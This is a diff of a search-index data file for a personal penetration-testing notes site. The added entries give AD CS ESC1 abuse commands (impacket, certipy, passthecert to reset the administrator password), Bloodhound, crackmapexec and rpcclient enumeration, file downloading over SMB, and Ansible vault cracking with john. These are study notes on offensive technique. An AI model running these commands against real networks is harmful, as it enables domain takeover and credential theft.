@@ -58,16 +58,6 @@ window.store = {
     
     
     
-    "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/": {
-        
-        "title": "#\u002btitle: Pentest - Active Directory - Certificate Services",
-        "tags": ["cert","activeDirectory","pentest",],
-        "content": "Active Directory Certificate Services social.technet.microsoft.com\nActive Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton\nAbusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify\nPS C:\\ \u0026gt; .\\Certify.exe find /vulnerable Here\u0026rsquo;s an example of a vulnerable cert template, which is used for client authentication. Domain Users have enrollments rights, and they\u0026rsquo;re also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)\n#+ATTR_ORG :width 1200 specterops - certified pre-owned\n", 
-        "url": "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/"
-    },
-    
-    
-    
     "https:\/\/kdbed.github.io\/posts\/pentesting_mssql_microsoft_sql_server\/": {
         
         "title": "1433 - Pentesting MSSQL - Microsoft SQL Server",
@@ -168,6 +158,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/tags\/ansible\/": {
+        
+        "title": "ansible",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/ansible\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/ansible_playbook_weaponization\/": {
         
         "title": "Ansible - Playbook weaponization",
@@ -244,6 +244,26 @@ window.store = {
         "tags": ["hashCollision","hashes","securityPlus",],
         "content": "Birthday Attack The birthday attack is named after the birthday paradox. The name is based on fact that in a room with 23 people or more, the odds are greater than 50% that two will share the same birthday. Many find this counterintuitive, and the birthday paradox illustrates why many people’s instinct on probability (and risk) is wrong. You are not trying to match a specific birthday (such as yours); you are trying to match any birthday.\nIf you are in a room full of 23 people, you have a 1 in 365 chance of sharing a birthday with each of the 22 other people in the room, for a total of 22/365 chances. If you fail to match, you leave the room and Joe has a 21/365 chance of sharing a birthday with the remaining people. If Joe fails to match, he leaves the room and Morgan has a 20/365 chance, and so on. If you add 22/365 + 21/365 + 20/365 + 19/365 … + 1/365, you pass 50% probability.\nThe birthday attack is used to create hash collisions. Just as matching your birthday is difficult, finding a specific input with a hash that collides with another input is difficult. However, just like matching any birthday is easier, finding any input that creates a colliding hash with any other input is easier due to the birthday attack.\nComptTIA Security+ ", 
         "url": "https:\/\/kdbed.github.io\/posts\/birthdayattack\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/bloodhound\/": {
+        
+        "title": "bloodhound",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/bloodhound\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/bloodhound\/": {
+        
+        "title": "Bloodhound",
+        "tags": ["activedirectory","enumeration","pentest","bloodhound",],
+        "content": "Bloodhound bloodhound-python bloodhound-python -u \u0026#39;\u0026lt;user\u0026gt;\u0026#39; -p \u0026#39;\u0026lt;pw\u0026gt;\u0026#39; --dns-tcp -ns \u0026lt;ip\u0026gt; -d \u0026lt;domain\u0026gt; -c all root@kali:~# bloodhound-python -h usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-d DOMAIN] [-v] [-u USERNAME] [-p PASSWORD] [-k] [--hashes HASHES] [-no-pass] [-aesKey hex key] [--auth-method {auto,ntlm,kerberos}] [-ns NAMESERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-dc HOST] [-gc HOST] [-w WORKERS] [--exclude-dcs] [--disable-pooling] [--disable-autogc] [--zip] [--computerfile COMPUTERFILE] [--cachefile CACHEFILE] Python based ingestor for BloodHound For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py options: -h, --help show this help message and exit -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default (all previous), DCOnly (no computer connections), DCOM, RDP,PSRemote, LoggedOn, Container, ObjectProps, ACL, All (all except LoggedOn). You can specify more than one by separating them with a comma. (default: Default) -d DOMAIN, --domain DOMAIN Domain to query. -v Enable verbose output authentication options: Specify one or more authentication options. By default Kerberos authentication is used and NTLM is used as fallback. Kerberos tickets are automatically requested if a password or hashes are specified. -u USERNAME, --username USERNAME Username. Format: username[@domain]; If the domain is unspecified, the current domain is used. -p PASSWORD, --password PASSWORD Password -k, --kerberos Use kerberos --hashes HASHES LM:NLTM hashes -no-pass don\u0026#39;t ask for password (useful for -k) -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) --auth-method {auto,ntlm,kerberos} Authentication methods. Force Kerberos or NTLM only or use auto for Kerberos with NTLM fallback collection options: -ns NAMESERVER, --nameserver NAMESERVER Alternative name server to use for queries --dns-tcp Use TCP instead of UDP for DNS queries --dns-timeout DNS_TIMEOUT DNS query timeout in seconds (default: 3) -dc HOST, --domain-controller HOST Override which DC to query (hostname) -gc HOST, --global-catalog HOST Override which GC to query (hostname) -w WORKERS, --workers WORKERS Number of workers for computer enumeration (default: 10) --exclude-dcs Skip DCs during computer enumeration --disable-pooling Don\u0026#39;t use subprocesses for ACL parsing (only for debugging purposes) --disable-autogc Don\u0026#39;t automatically select a Global Catalog (use only if it gives errors) --zip Compress the JSON output files into a zip archive --computerfile COMPUTERFILE File containing computer FQDNs to use as allowlist for any computer based methods --cachefile CACHEFILE Cache file (experimental) ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/bloodhound\/"
     },
     
     
@@ -424,6 +444,26 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "https:\/\/kdbed.github.io\/tags\/crack\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/tags\/cracking\/": {
+        
+        "title": "cracking",
+        "tags": [],
+        "content": "", 
+        "url": "https:\/\/kdbed.github.io\/tags\/cracking\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/cracking_ansible\/": {
+        
+        "title": "Cracking - Ansible",
+        "tags": ["pentest","cracking","ansible",],
+        "content": "Cracking Ansible vaults Find Ansible vault \u0026ndash; encrypted creds\n$ANSIBLE_VAULT;1.1;AES256 32666534386435366537653136663731633138616264323230383566333966346662313161326239 6134353663663462373265633832356663356239383039640a346431373431666433343434366139 35653634376333666234613466396534343030656165396464323564373334616262613439343033 6334326263326364380a653034313733326639323433626130343834663538326439636232306531 3438 Convert to correct form for john\n/usr/share/john/ansible2john.py pwm_ansible_admin.yml \u0026gt; out.yml Then crack with john \u0026ndash;\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/cracking_ansible\/"
     },
     
     
@@ -1248,6 +1288,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/": {
+        
+        "title": "Pentest - Active Directory - Certificate Services",
+        "tags": ["cert","activeDirectory","pentest",],
+        "content": "Active Directory Certificate Services social.technet.microsoft.com\nActive Directory Certificate Services (AD CS) is an Active Directory server role which allows users to build PKI (Public Key Infrastructure). This can provide practical solutions for VPN access, SSL/TLS certificates and smart card logons, amongst other similar ubiquitous technologies you are likely to encounter on a daily basis. medium - shaun whorton\nAbusing misconfigured certificate templates Use Certify.exe to enumerate Certificate Services GhostPack/Certify\nPS C:\\ \u0026gt; .\\Certify.exe find /vulnerable Here\u0026rsquo;s an example of a vulnerable cert template, which is used for client authentication. Domain Users have enrollments rights, and they\u0026rsquo;re also permitted to supply the subject (msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT)\nPython https://github.com/ly4k/Certipy\nspecterops - certified pre-owned\nExamples ESC1 vulnerability Client Authentication: True - an issued certificate can be used for client authentication purposes.\nEnrollee Supplies Subject : True - a Subject Alternative Name can be specified which allows a certificate to be requested as another user on the system (e.g., administrator).\nRequires Manager Approval : False - a requested certificate doesn\u0026rsquo;t require approval from a user with certificate manager permissions.\nEnrollment Rights : Domain\\Domain Computers - this gives low-level users the ability to request a certificate by simply joining a computer to the domain.\nUser happens to be able to join machines to the domain \u0026ndash; from whoami /priv\nPrivilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled Use impacket to join a computer to the domain:\naddcomputer.py \u0026#39;domain/\u0026lt;user\u0026gt;:\u0026lt;pw\u0026gt;\u0026#39; -method LDAPS -computer-name \u0026#39;PC01\u0026#39; -computer-pass \u0026#39;Welcome123\u0026#39; Use certipy to request cert for admin\ncertipy req -username \u0026#39;PC01$\u0026#39; -password \u0026#39;Welcome123\u0026#39; -ca AUTHORITY-CA -target \u0026lt;ip\u0026gt; -template \u0026#39;\u0026#39; -upn \u0026#39;administrator@domain\u0026#39; Can try to auth\ncertipy auth -pfx administrator.pfx In this case there\u0026rsquo;s a kerberos session error -\u0026gt; authenticate with LDAP instead of kerberos. Use PassTheCert \u0026ndash; first convert\ncertipy cert -pfx administrator.pfx -nokey -out user.crt certipy cert -pfx administrator.pfx -nocert -out user.key Then, eg, change the admin password:\npython3 passthecert.py -action modify_user -crt user.crt -key user.key -domain \u0026lt;domain\u0026gt; -dc-ip \u0026lt;ip\u0026gt; -target administrator -new-pass ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/active_directory_certificate_services_pentest\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_dcsync\/": {
         
         "title": "Pentest - Active Directory - DCSync",
@@ -1322,7 +1372,7 @@ window.store = {
         
         "title": "Pentest - SMB p 139,445",
         "tags": ["crackmapexec","smbmap","smb","pentest",],
-        "content": "HackTricks\nPort 139 NetBIOS NetBIOS is Network Basic Input Output System, which is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network.\nPort 445 SMB - Server Message Block While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’.\nSMB Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.\nServer Enumeration Search for hosts:\n1 nbtscan -r 192.168.1.1/24 SMB information 1 2 3 4 5 6 7 enum4linux -a [-u \u0026#34;\u0026lt;username\u0026gt;\u0026#34; -p \u0026#34;\u0026lt;passwd\u0026gt;\u0026#34;] \u0026lt;IP\u0026gt; enum4linux-ng -A [-u \u0026#34;\u0026lt;username\u0026gt;\u0026#34; -p \u0026#34;\u0026lt;passwd\u0026gt;\u0026#34;] \u0026lt;IP\u0026gt; # connect to rpc rpcclient -U \u0026#34;\u0026#34; -N \u0026lt;IP\u0026gt; #No creds rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash rpcclient -U \u0026#34;username%passwd\u0026#34; \u0026lt;IP\u0026gt; #With creds smbclient -L /10.10.10.10 smbclient //10.10.10.10/Public\nSee also impacket: samrdump, rpcdump\nUsers, Groups 1 2 3 4 5 6 7 8 9 10 11 crackmapexec smb 10.10.10.10 --users [-u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;] crackmapexec smb 10.10.10.10 --groups [-u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;] crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;] crackmapexec smb 10.10.10.10 -u usernames.txt -p ‘’ --continue-on-success ldapsearch -x -b \u0026#34;DC=DOMAIN_NAME,DC=LOCAL\u0026#34; -s sub \u0026#34;(\u0026amp;(objectclass=user))\u0026#34; -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d \u0026#34; \u0026#34; rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.10 enumdomusers enumdomgroups Anonymous logon crackmapexec smb \u0026lt;host\u0026gt; -u \u0026#39;a\u0026#39; -p \u0026#39;\u0026#39; --shares ", 
+        "content": "HackTricks\nPort 139 NetBIOS NetBIOS is Network Basic Input Output System, which is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network.\nPort 445 SMB - Server Message Block While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’.\nSMB Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network.\nServer Enumeration Search for hosts:\n1 nbtscan -r 192.168.1.1/24 SMB information 1 2 3 4 5 6 7 enum4linux -a [-u \u0026#34;\u0026lt;username\u0026gt;\u0026#34; -p \u0026#34;\u0026lt;passwd\u0026gt;\u0026#34;] \u0026lt;IP\u0026gt; enum4linux-ng -A [-u \u0026#34;\u0026lt;username\u0026gt;\u0026#34; -p \u0026#34;\u0026lt;passwd\u0026gt;\u0026#34;] \u0026lt;IP\u0026gt; # connect to rpc rpcclient -U \u0026#34;\u0026#34; -N \u0026lt;IP\u0026gt; #No creds rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash rpcclient -U \u0026#34;username%passwd\u0026#34; \u0026lt;IP\u0026gt; #With creds smbclient -L ////10.10.10.10/// smbclient //10.10.10.10/Public See also impacket: samrdump, rpcdump\nUsers, Groups 1 2 3 4 5 6 7 8 9 10 11 crackmapexec smb 10.10.10.10 --users [-u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;] crackmapexec smb 10.10.10.10 --groups [-u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;] crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;] crackmapexec smb 10.10.10.10 -u usernames.txt -p ‘’ --continue-on-success ldapsearch -x -b \u0026#34;DC=DOMAIN_NAME,DC=LOCAL\u0026#34; -s sub \u0026#34;(\u0026amp;(objectclass=user))\u0026#34; -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d \u0026#34; \u0026#34; rpcclient -U \u0026#34;\u0026#34; -N 10.10.10.10 enumdomusers enumdomgroups Anonymous logon crackmapexec smb \u0026lt;host\u0026gt; -u \u0026#39;a\u0026#39; -p \u0026#39;\u0026#39; --shares List files crackmapexec smb \u0026lt;host\u0026gt; -u \u0026#39;a\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus Download files crackmapexec smb \u0026lt;host\u0026gt; -u \u0026#39;a\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus -o READ_ONLY=false EXCLUDE_DIR=IPC$ ", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_smb_p_139_445\/"
     },
     
